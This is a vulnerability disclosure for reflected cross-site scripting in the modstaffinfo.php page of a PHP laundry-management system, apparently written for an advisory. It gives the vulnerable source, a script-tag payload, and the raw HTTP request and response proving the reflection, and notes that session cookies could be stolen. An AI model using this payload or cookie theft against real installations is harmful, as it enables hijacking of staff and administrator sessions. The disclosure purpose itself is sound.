## SIMPLE_LAUNDRY_SYSTEM modstaffinfo.php Reflected Cross-Site Scripting Vulnerability

### I. Vulnerability Impact

The `userid` parameter of `modstaffinfo.php` is placed into a SQL statement without validation and the resulting database error, which contains the attacker's input verbatim, is echoed into the HTML page without encoding. An attacker who sends a crafted link therefore executes arbitrary JavaScript in the browser of any staff member or administrator who opens it. The session cookie issued by this application carries no `HttpOnly` flag, so the injected script can read `document.cookie` and take over the victim's staff session, gaining access to member management, staff management and the order functions.

### II. Source Code Analysis

The vulnerability resides in `modstaffinfo.php`, lines 28-34:

```php
$userid = $_GET['userid'];
$q = "select * from staff where staffId=$userid";
$result = $mysqli->query($q);
if(!$result){
    echo "Select failed: ".$mysqli->error;
}
$urow = $result->fetch_array();
```

`$userid` is taken straight from `$_GET` and appended to `staffId=` **without quotes**, so the value is parsed as a SQL expression rather than as a literal. Any non-numeric input therefore breaks the statement and makes `$mysqli->query()` return `false`.

Line 32 then copies the MySQL error text into the response with a plain `echo`. MySQL quotes the offending fragment of the statement inside that error message, which means the attacker's own characters are written back into the HTML document with no `htmlspecialchars()`, `htmlentities()` or `strip_tags()` applied anywhere in the path. Because the page is served as `Content-Type: text/html; charset=UTF-8`, the browser parses the reflected string as markup and executes any tag it contains — the database error message becomes the XSS sink.

The script only requires `connect.php`; it contains no `session_start()` and no session check, so the reflection happens for unauthenticated requests as well. Line 34 additionally calls `fetch_array()` on the boolean `false`, which raises a fatal error that is also visible in the response.

### III. Payload

The injection payload is:

```
<sCrIpT>alert(1)</sCrIpT>
```

Mixed case is used because the value never reaches a filter that would look for the lowercase form; the only processing it undergoes is being concatenated into the query.

The parameter is unquoted in the statement, so the payload produces a syntax error whose message quotes the injected fragment:

```sql
select * from staff where staffId=<sCrIpT>alert(1)</sCrIpT>
```

and that error text is written into the page unmodified:

```html
Select failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(1)</sCrIpT>' at line 1<br />
```

```
GET /modstaffinfo.php?userid=<sCrIpT>alert(1)</sCrIpT> HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/staffmanagement.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The payload is returned inside an HTML document without any encoding, which proves that the browser will parse and execute it:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:20:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Content-Length: 998

<!DOCTYPE html>
<html>
<head>
<title>ITS351_PROJECT</title>
<link rel="stylesheet" type="text/css" href="stylesbackup1.css">
...
</div>

  <body>
    Select failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(1)</sCrIpT>' at line 1<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_array() on bool in E:\phpstudy_pro\WWW\bbn\modstaffinfo.php:34
Stack trace:
#0 {main}
thrown in <b>E:\phpstudy_pro\WWW\bbn\modstaffinfo.php</b> on line <b>34</b><br />
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030172156315](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030172156315.png)
